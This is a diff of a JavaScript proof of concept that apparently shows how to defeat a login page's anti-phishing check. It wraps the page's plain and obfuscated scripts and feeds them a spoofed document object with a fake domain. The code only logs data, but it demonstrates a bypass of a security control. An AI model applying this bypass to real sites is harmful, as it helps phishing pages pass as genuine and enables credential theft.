@@ -1,3 +1,6 @@
+//It is possible to overcome the phishing protection by wrapping a wrapper around each JavaScript in the login page.
+// The following POC is intended to show how to overcome the phishing protection from the video (https://www.youtube.com/watch?v=C-Fh4sIdY8c).
+
 function wrapper(document) {
 	function elementToObject(el) {	
 		var o = {
@@ -21,16 +24,17 @@ function wrapper(document) {
 	console.log("spooft-secret "+secret);
 }
 
-var mydocSpoof = {querySelector: function () {return {tag:"form",baseURI:"www.spoofed-domain.test",children: []}}}
+var mydocSpoof = {querySelector: function () {return {tagName:"form",baseURI:"www.spoofed-domain.test",children: []}}}
 wrapper(mydocSpoof)
 
 #############################################################################################################################
+//The obfuscated variant can also be overcome. The wrapper works in the same way as with plain text code.
 
 function wrapper(document) {
 
-var _0x5e1420=_0x37ef;(function(_0x2edb56,_0x1f4f33){var _0x1a43af=_0x37ef,_0x17edec=_0x2edb56();while(!![]){try{var _0x26b463=parseInt(_0x1a43af(0x1ab))/0x1+-parseInt(_0x1a43af(0x1a2))/0x2*(-parseInt(_0x1a43af(0x1a5))/0x3)+parseInt(_0x1a43af(0x19e))/0x4+-parseInt(_0x1a43af(0x19f))/0x5*(-parseInt(_0x1a43af(0x1a7))/0x6)+-parseInt(_0x1a43af(0x1af))/0x7*(-parseInt(_0x1a43af(0x1ac))/0x8)+parseInt(_0x1a43af(0x1ae))/0x9+parseInt(_0x1a43af(0x1a9))/0xa*(-parseInt(_0x1a43af(0x1a4))/0xb);if(_0x26b463===_0x1f4f33)break;else _0x17edec['push'](_0x17edec['shift']());}catch(_0x8d0d2c){_0x17edec['push'](_0x17edec['shift']());}}}(_0xd626,0x9c4b4));function _0x37ef(_0x2cb028,_0x5aa476){var _0xd6260c=_0xd626();return _0x37ef=function(_0x37ef3b,_0x2b8a3e){_0x37ef3b=_0x37ef3b-0x19e;var _0x1e3c9d=_0xd6260c[_0x37ef3b];return _0x1e3c9d;},_0x37ef(_0x2cb028,_0x5aa476);}function elementToObject(_0x3c7113){var _0x4dca31=_0x37ef,_0x19e5e6={'tag':_0x3c7113[_0x4dca31(0x1a0)],'baseURI':_0x3c7113[_0x4dca31(0x1aa)],'children':[]},_0x4b8023=0x0;if(_0x3c7113[_0x4dca31(0x1a3)][_0x4dca31(0x1a6)]){_0x4b8023=0x0;for(_0x4b8023;_0x4b8023<_0x3c7113[_0x4dca31(0x1a3)]['length'];_0x4b8023++){_0x19e5e6[_0x4dca31(0x1a3)][_0x4b8023]=elementToObject(_0x3c7113[_0x4dca31(0x1a3)][_0x4b8023]),console['log'](_0x19e5e6['children'][_0x4b8023]);}}return _0x19e5e6;}var secret=JSON[_0x5e1420(0x1a1)](elementToObject(document['querySelector'](_0x5e1420(0x1ad))));function _0xd626(){var _0x543cb2=['21mOjyuQ','4963148cYiNMO','347455gZdtZH','tagName','stringify','1312FVdTFM','children','20395529QMMPzJ','531YBAXor','length','96PdEKta','log','20zkKhmQ','baseURI','448801pXDXTX','2351640FuAEbi','body','4941333lVSNaJ'];_0xd626=function(){return _0x543cb2;};return _0xd626();}console[_0x5e1420(0x1a8)]('spooft-secret\x20'+secret);
+	function _0x4abb(_0xa856e1,_0x70d9a){var _0x2b5721=_0x2b57();return _0x4abb=function(_0x4abb71,_0x460f4d){_0x4abb71=_0x4abb71-0xe3;var _0x16e76a=_0x2b5721[_0x4abb71];return _0x16e76a;},_0x4abb(_0xa856e1,_0x70d9a);}var _0x4cd920=_0x4abb;(function(_0x2a8c44,_0x209b11){var _0xc12061=_0x4abb,_0x5b5322=_0x2a8c44();while(!![]){try{var _0x58b7fa=-parseInt(_0xc12061(0xf5))/0x1*(-parseInt(_0xc12061(0xe8))/0x2)+-parseInt(_0xc12061(0xf1))/0x3*(-parseInt(_0xc12061(0xe4))/0x4)+parseInt(_0xc12061(0xe3))/0x5*(-parseInt(_0xc12061(0xec))/0x6)+-parseInt(_0xc12061(0xf4))/0x7+parseInt(_0xc12061(0xeb))/0x8+-parseInt(_0xc12061(0xe5))/0x9+-parseInt(_0xc12061(0xef))/0xa*(parseInt(_0xc12061(0xf0))/0xb);if(_0x58b7fa===_0x209b11)break;else _0x5b5322['push'](_0x5b5322['shift']());}catch(_0x916e1b){_0x5b5322['push'](_0x5b5322['shift']());}}}(_0x2b57,0x43082));function elementToObject(_0x224ea8){var _0x5e36a8=_0x4abb,_0x531e81={'tag':_0x224ea8[_0x5e36a8(0xe7)],'baseURI':_0x224ea8['baseURI'],'children':[]},_0x208add=0x0;if(_0x224ea8[_0x5e36a8(0xf2)][_0x5e36a8(0xe6)]){_0x208add=0x0;for(_0x208add;_0x208add<_0x224ea8['children']['length'];_0x208add++){_0x531e81[_0x5e36a8(0xf2)][_0x208add]=elementToObject(_0x224ea8[_0x5e36a8(0xf2)][_0x208add]),console['log'](_0x531e81[_0x5e36a8(0xf2)][_0x208add]);}}return _0x531e81;}function _0x2b57(){var _0x58886f=['2WLLCip','body','spooft-secret\x20','3602048QOPqcH','6UTqHSn','stringify','log','764410LpvcJR','11XomPxn','15eKJxtt','children','querySelector','1375962NkUfNQ','418667FcHdTM','735065tfklWF','258508syVegt','4477284DqHJkr','length','tagName'];_0x2b57=function(){return _0x58886f;};return _0x2b57();}var secret=JSON[_0x4cd920(0xed)](elementToObject(document[_0x4cd920(0xf3)](_0x4cd920(0xe9))));console[_0x4cd920(0xee)](_0x4cd920(0xea)+secret);
 
 }
 
-var mydocSpoof = {querySelector: function () {return {tag:"form",baseURI:"www.spoofed-domain.test",children: []}}}
+var mydocSpoof = {querySelector: function () {return {tagName:"form",baseURI:"www.spoofed-domain.test",children: []}}}
 wrapper(mydocSpoof)
